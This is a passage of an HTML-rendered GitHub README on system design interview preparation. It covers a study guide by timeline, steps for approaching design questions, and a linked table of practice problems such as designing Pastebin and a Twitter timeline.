&lt;li&gt;&lt;a href="#when-to-update-the-cache"&gt;When to update the cache&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#cache-aside"&gt;Cache-aside&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#write-through"&gt;Write-through&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#write-behind-write-back"&gt;Write-behind (write-back)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#refresh-ahead"&gt;Refresh-ahead&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#asynchronism"&gt;Asynchronism&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#message-queues"&gt;Message queues&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#task-queues"&gt;Task queues&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#back-pressure"&gt;Back pressure&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#communication"&gt;Communication&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#transmission-control-protocol-tcp"&gt;Transmission control protocol (TCP)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#user-datagram-protocol-udp"&gt;User datagram protocol (UDP)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#remote-procedure-call-rpc"&gt;Remote procedure call (RPC)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#representational-state-transfer-rest"&gt;Representational state transfer (REST)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#security"&gt;Security&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#appendix"&gt;Appendix&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#powers-of-two-table"&gt;Powers of two table&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#latency-numbers-every-programmer-should-know"&gt;Latency numbers every programmer should know&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#additional-system-design-interview-questions"&gt;Additional system design interview questions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#real-world-architectures"&gt;Real world architectures&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#company-architectures"&gt;Company architectures&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#company-engineering-blogs"&gt;Company engineering blogs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#under-development"&gt;Under development&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#credits"&gt;Credits&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#contact-info"&gt;Contact info&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#license"&gt;License&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-study-guide" class="anchor" aria-hidden="true" href="#study-guide"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Study guide&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Suggested topics to review based on your interview timeline (short, medium, long).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/eb92600aa3bb1314b33edd0204da8428d4d3a493/687474703a2f2f692e696d6775722e636f6d2f4f66566c6c65782e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/eb92600aa3bb1314b33edd0204da8428d4d3a493/687474703a2f2f692e696d6775722e636f6d2f4f66566c6c65782e706e67" alt="Imgur" data-canonical-src="http://i.imgur.com/OfVllex.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Q: For interviews, do I need to know everything here?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A: No, you don't need to know everything here to prepare for the interview&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;What you are asked in an interview depends on variables such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;How much experience you have&lt;/li&gt;
&lt;li&gt;What your technical background is&lt;/li&gt;
&lt;li&gt;What positions you are interviewing for&lt;/li&gt;
&lt;li&gt;Which companies you are interviewing with&lt;/li&gt;
&lt;li&gt;Luck&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;More experienced candidates are generally expected to know more about system design.  Architects or team leads might be expected to know more than individual contributors.  Top tech companies are likely to have one or more design interview rounds.&lt;/p&gt;
&lt;p&gt;Start broad and go deeper in a few areas.  It helps to know a little about various key system design topics.  Adjust the following guide based on your timeline, experience, what positions you are interviewing for, and which companies you are interviewing with.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Short timeline&lt;/strong&gt; - Aim for &lt;strong&gt;breadth&lt;/strong&gt; with system design topics.  Practice by solving &lt;strong&gt;some&lt;/strong&gt; interview questions.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Medium timeline&lt;/strong&gt; - Aim for &lt;strong&gt;breadth&lt;/strong&gt; and &lt;strong&gt;some depth&lt;/strong&gt; with system design topics.  Practice by solving &lt;strong&gt;many&lt;/strong&gt; interview questions.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Long timeline&lt;/strong&gt; - Aim for &lt;strong&gt;breadth&lt;/strong&gt; and &lt;strong&gt;more depth&lt;/strong&gt; with system design topics.  Practice by solving &lt;strong&gt;most&lt;/strong&gt; interview questions.&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;Short&lt;/th&gt;
&lt;th&gt;Medium&lt;/th&gt;
&lt;th&gt;Long&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Read through the &lt;a href="#index-of-system-design-topics"&gt;System design topics&lt;/a&gt; to get a broad understanding of how systems work&lt;/td&gt;
&lt;td&gt;&lt;g-emoji class="g-emoji" alias="+1" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png"&gt;👍&lt;/g-emoji&gt;&lt;/td&gt;
&lt;td&gt;&lt;g-emoji class="g-emoji" alias="+1" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png"&gt;👍&lt;/g-emoji&gt;&lt;/td&gt;
&lt;td&gt;&lt;g-emoji class="g-emoji" alias="+1" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png"&gt;👍&lt;/g-emoji&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Read through a few articles in the &lt;a href="#company-engineering-blogs"&gt;Company engineering blogs&lt;/a&gt; for the companies you are interviewing with&lt;/td&gt;
&lt;td&gt;&lt;g-emoji class="g-emoji" alias="+1" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png"&gt;👍&lt;/g-emoji&gt;&lt;/td&gt;
&lt;td&gt;&lt;g-emoji class="g-emoji" alias="+1" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png"&gt;👍&lt;/g-emoji&gt;&lt;/td&gt;
&lt;td&gt;&lt;g-emoji class="g-emoji" alias="+1" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png"&gt;👍&lt;/g-emoji&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Read through a few &lt;a href="#real-world-architectures"&gt;Real world architectures&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;g-emoji class="g-emoji" alias="+1" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png"&gt;👍&lt;/g-emoji&gt;&lt;/td&gt;
&lt;td&gt;&lt;g-emoji class="g-emoji" alias="+1" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png"&gt;👍&lt;/g-emoji&gt;&lt;/td&gt;
&lt;td&gt;&lt;g-emoji class="g-emoji" alias="+1" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png"&gt;👍&lt;/g-emoji&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Review &lt;a href="#how-to-approach-a-system-design-interview-question"&gt;How to approach a system design interview question&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;g-emoji class="g-emoji" alias="+1" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png"&gt;👍&lt;/g-emoji&gt;&lt;/td&gt;
&lt;td&gt;&lt;g-emoji class="g-emoji" alias="+1" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png"&gt;👍&lt;/g-emoji&gt;&lt;/td&gt;
&lt;td&gt;&lt;g-emoji class="g-emoji" alias="+1" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f44d.png"&gt;👍&lt;/g-emoji&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Work through &lt;a href="#system-design-interview-questions-with-solutions"&gt;System design interview questions with solutions&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Some&lt;/td&gt;
&lt;td&gt;Many&lt;/td&gt;
&lt;td&gt;Most&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Work through &lt;a href="#object-oriented-design-interview-questions-with-solutions"&gt;Object-oriented design interview questions with solutions&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Some&lt;/td&gt;
&lt;td&gt;Many&lt;/td&gt;
&lt;td&gt;Most&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Review &lt;a href="#additional-system-design-interview-questions"&gt;Additional system design interview questions&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Some&lt;/td&gt;
&lt;td&gt;Many&lt;/td&gt;
&lt;td&gt;Most&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&lt;a id="user-content-how-to-approach-a-system-design-interview-question" class="anchor" aria-hidden="true" href="#how-to-approach-a-system-design-interview-question"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How to approach a system design interview question&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;How to tackle a system design interview question.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The system design interview is an &lt;strong&gt;open-ended conversation&lt;/strong&gt;.  You are expected to lead it.&lt;/p&gt;
&lt;p&gt;You can use the following steps to guide the discussion.  To help solidify this process, work through the &lt;a href="#system-design-interview-questions-with-solutions"&gt;System design interview questions with solutions&lt;/a&gt; section using the following steps.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-step-1-outline-use-cases-constraints-and-assumptions" class="anchor" aria-hidden="true" href="#step-1-outline-use-cases-constraints-and-assumptions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Step 1: Outline use cases, constraints, and assumptions&lt;/h3&gt;
&lt;p&gt;Gather requirements and scope the problem.  Ask questions to clarify use cases and constraints.  Discuss assumptions.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Who is going to use it?&lt;/li&gt;
&lt;li&gt;How are they going to use it?&lt;/li&gt;
&lt;li&gt;How many users are there?&lt;/li&gt;
&lt;li&gt;What does the system do?&lt;/li&gt;
&lt;li&gt;What are the inputs and outputs of the system?&lt;/li&gt;
&lt;li&gt;How much data do we expect to handle?&lt;/li&gt;
&lt;li&gt;How many requests per second do we expect?&lt;/li&gt;
&lt;li&gt;What is the expected read to write ratio?&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-step-2-create-a-high-level-design" class="anchor" aria-hidden="true" href="#step-2-create-a-high-level-design"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Step 2: Create a high level design&lt;/h3&gt;
&lt;p&gt;Outline a high level design with all important components.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sketch the main components and connections&lt;/li&gt;
&lt;li&gt;Justify your ideas&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-step-3-design-core-components" class="anchor" aria-hidden="true" href="#step-3-design-core-components"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Step 3: Design core components&lt;/h3&gt;
&lt;p&gt;Dive into details for each core component.  For example, if you were asked to &lt;a href="solutions/system_design/pastebin/README.md"&gt;design a url shortening service&lt;/a&gt;, discuss:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Generating and storing a hash of the full url
&lt;ul&gt;
&lt;li&gt;&lt;a href="solutions/system_design/pastebin/README.md"&gt;MD5&lt;/a&gt; and &lt;a href="solutions/system_design/pastebin/README.md"&gt;Base62&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Hash collisions&lt;/li&gt;
&lt;li&gt;SQL or NoSQL&lt;/li&gt;
&lt;li&gt;Database schema&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Translating a hashed url to the full url
&lt;ul&gt;
&lt;li&gt;Database lookup&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;API and object-oriented design&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-step-4-scale-the-design" class="anchor" aria-hidden="true" href="#step-4-scale-the-design"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Step 4: Scale the design&lt;/h3&gt;
&lt;p&gt;Identify and address bottlenecks, given the constraints.  For example, do you need the following to address scalability issues?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Load balancer&lt;/li&gt;
&lt;li&gt;Horizontal scaling&lt;/li&gt;
&lt;li&gt;Caching&lt;/li&gt;
&lt;li&gt;Database sharding&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Discuss potential solutions and trade-offs.  Everything is a trade-off.  Address bottlenecks using &lt;a href="#index-of-system-design-topics"&gt;principles of scalable system design&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-back-of-the-envelope-calculations" class="anchor" aria-hidden="true" href="#back-of-the-envelope-calculations"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Back-of-the-envelope calculations&lt;/h3&gt;
&lt;p&gt;You might be asked to do some estimates by hand.  Refer to the &lt;a href="#appendix"&gt;Appendix&lt;/a&gt; for the following resources:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://highscalability.com/blog/2011/1/26/google-pro-tip-use-back-of-the-envelope-calculations-to-choo.html" rel="nofollow"&gt;Use back of the envelope calculations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#powers-of-two-table"&gt;Powers of two table&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#latency-numbers-every-programmer-should-know"&gt;Latency numbers every programmer should know&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-sources-and-further-reading" class="anchor" aria-hidden="true" href="#sources-and-further-reading"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading&lt;/h3&gt;
&lt;p&gt;Check out the following links to get a better idea of what to expect:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.palantir.com/2011/10/how-to-rock-a-systems-design-interview/" rel="nofollow"&gt;How to ace a systems design interview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.hiredintech.com/system-design" rel="nofollow"&gt;The system design interview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=ZgdS0EUmn70" rel="nofollow"&gt;Intro to Architecture and Systems Design Interviews&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-system-design-interview-questions-with-solutions" class="anchor" aria-hidden="true" href="#system-design-interview-questions-with-solutions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;System design interview questions with solutions&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Common system design interview questions with sample discussions, code, and diagrams.&lt;/p&gt;
&lt;p&gt;Solutions linked to content in the &lt;code&gt;solutions/&lt;/code&gt; folder.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Question&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Design Pastebin.com (or Bit.ly)&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/system_design/pastebin/README.md"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design the Twitter timeline and search (or Facebook feed and search)&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/system_design/twitter/README.md"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a web crawler&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/system_design/web_crawler/README.md"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design Mint.com&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/system_design/mint/README.md"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design the data structures for a social network&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/system_design/social_graph/README.md"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a key-value store for a search engine&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/system_design/query_cache/README.md"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design Amazon's sales ranking by category feature&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/system_design/sales_rank/README.md"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Design a system that scales to millions of users on AWS&lt;/td&gt;
&lt;td&gt;&lt;a href="solutions/system_design/scaling_aws/README.md"&gt;Solution&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Add a system design question&lt;/td&gt;
&lt;td&gt;&lt;a href="#contributing"&gt;Contribute&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-design-pastebincom-or-bitly" class="anchor" aria-hidden="true" href="#design-pastebincom-or-bitly"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Design Pastebin.com (or Bit.ly)&lt;/h3&gt;
&lt;p&gt;&lt;a href="solutions/system_design/pastebin/README.md"&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/4aee2d26ebedc20e7fa07a2c30780e332fa29f2c/687474703a2f2f692e696d6775722e636f6d2f346564584730542e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/4aee2d26ebedc20e7fa07a2c30780e332fa29f2c/687474703a2f2f692e696d6775722e636f6d2f346564584730542e706e67" alt="Imgur" data-canonical-src="http://i.imgur.com/4edXG0T.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-design-the-twitter-timeline-and-search-or-facebook-feed-and-search" class="anchor" aria-hidden="true" href="#design-the-twitter-timeline-and-search-or-facebook-feed-and-search"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Design the Twitter timeline and search (or Facebook feed and search)&lt;/h3&gt;
&lt;p&gt;&lt;a href="solutions/system_design/twitter/README.md"&gt;View exercise and solution&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/14f76dab28dfbfa12ea6b02c6bd0ec726fc17306/687474703a2f2f692e696d6775722e636f6d2f6a7255424146372e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/14f76dab28dfbfa12ea6b02c6bd0ec726fc17306/687474703a2f2f692e696d6775722e636f6d2f6a7255424146372e706e67" alt="Imgur" data-canonical-src="http://i.imgur.com/jrUBAF7.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
